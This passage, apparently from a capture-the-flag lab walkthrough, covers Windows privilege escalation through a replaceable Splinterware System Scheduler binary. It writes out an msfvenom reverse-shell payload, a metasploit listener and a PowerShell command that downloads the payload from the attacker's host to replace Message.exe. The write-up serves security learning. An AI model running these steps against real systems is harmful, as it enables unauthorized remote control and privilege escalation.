    Running  SystemEventsBroker System Events Broker                  
    Stopped  TapiSrv            Telephony                             
    Running  TermService        Remote Desktop Services               
    Running  Themes             Themes                                
    Stopped  THREADORDER        Thread Ordering Server                
    Stopped  TieringEngineSe... Storage Tiers Management              
    Running  TrkWks             Distributed Link Tracking Client      
    Stopped  TrustedInstaller   Windows Modules Installer             
    Running  UALSVC             User Access Logging Service           
    Stopped  UI0Detect          Interactive Services Detection        
    Running  UmRdpService       Remote Desktop Services UserMode Po...
    Stopped  VaultSvc           Credential Manager                    
    Running  vds                Virtual Disk                          
    Stopped  vmicguestinterface Hyper-V Guest Service Interface       
    Stopped  vmicheartbeat      Hyper-V Heartbeat Service             
    Stopped  vmickvpexchange    Hyper-V Data Exchange Service         
    Stopped  vmicrdv            Hyper-V Remote Desktop Virtualizati...
    Stopped  vmicshutdown       Hyper-V Guest Shutdown Service        
    Stopped  vmictimesync       Hyper-V Time Synchronization Service  
    Stopped  vmicvss            Hyper-V Volume Shadow Copy Requestor  
    Stopped  VSS                Volume Shadow Copy                    
    Running  W32Time            Windows Time                          
    Stopped  w3logsvc           W3C Logging Service                   
    Running  W3SVC              World Wide Web Publishing Service     
    Running  WAS                Windows Process Activation Service    
    Running  Wcmsvc             Windows Connection Manager            
    Stopped  WcsPlugInService   Windows Color System                  
    Stopped  WdiServiceHost     Diagnostic Service Host               
    Stopped  WdiSystemHost      Diagnostic System Host                
    Stopped  Wecsvc             Windows Event Collector               
    Stopped  WEPHOSTSVC         Windows Encryption Provider Host Se...
    Stopped  wercplsupport      Problem Reports and Solutions Contr...
    Stopped  WerSvc             Windows Error Reporting Service       
    Running  WindowsScheduler   System Scheduler Service              
    Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
    Running  Winmgmt            Windows Management Instrumentation    
    Running  WinRM              Windows Remote Management (WS-Manag...
    Running  WLMS               Windows Licensing Monitoring Service  
    Stopped  wmiApSrv           WMI Performance Adapter               
    Stopped  WPDBusEnum         Portable Device Enumerator Service    
    Stopped  WSService          Windows Store Service (WSService)     
    Stopped  wuauserv           Windows Update                        
    Stopped  wudfsvc            Windows Driver Foundation - User-mo...

We can see from the description, that System Scheduler's service name is `WindowsScheduler`.

### 4 - What is the name of the binary you're supposed to exploit? 

Message.exe

### 5 - Using this abnormal service, escalate your privileges!

Typing in System Scheduler Professional - Version 5.12 CVE, comes up with this:

https://www.exploit-db.com/exploits/45072

According to this the steps to recreate Privilege Escalation with this vulnerability are:

Proof of Concept

1. Login as regular user where Splinterware System Scheduler Pro 5.12 and the service are installed 
2. Create malicious .exe with same name 'wservice.exe' that can connect back to attacking machine
3. Download malicious .exe on victim machine, and setup listener on attacking machine
4. Rename original wservice.exe file to wservice.bak, and copy malicious file to location of original   
5. wait short amount of time and check attacking machine listener
6. connection back from victim machine successful, run whoami

So for us we need to:

1. Create a malicious payload (using msfvenom like before) named Message.exe, same LHOST, different LPORT.
2. Start up another metasploit handler with same config as the payload.
3. Download the Message.exe file on the victim (box) using Powershell's Invoke-WebRequest
4. Rename the original Message.exe to Message.exe.bak, and copy the file into the SystemScheduler folder.
5. Wait for the Message.exe file to be executed.
6. Shell created!

Let's try this out:

1. Create Payload:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.82.167 LPORT=1234 -f exe > Message.exe

2. Start up another metasploit handler (background the first with Ctrl+Z):

    set LPORT 1234
    run

3. Download the Message.exe file onto the victim box:
   
   cd c:\Program Files (x86)\SystemScheduler\
   ren Message.exe Message.exe.bak
   powershell Invoke-WebRequest -Uri http://10.8.82.167/Message.exe -Outfile Message.exe

   (Unsure if we have the ability to write in here, but we'll see).

4. Wait.

Original Size:
03/25/2018  10:58 AM           536,992 Message.exe

New Size:
07/31/2020  03:40 PM            73,802 Message.exe


10.10.200.77



What is the user flag (on Jeffs Desktop)?
#6 	

What is the root flag?

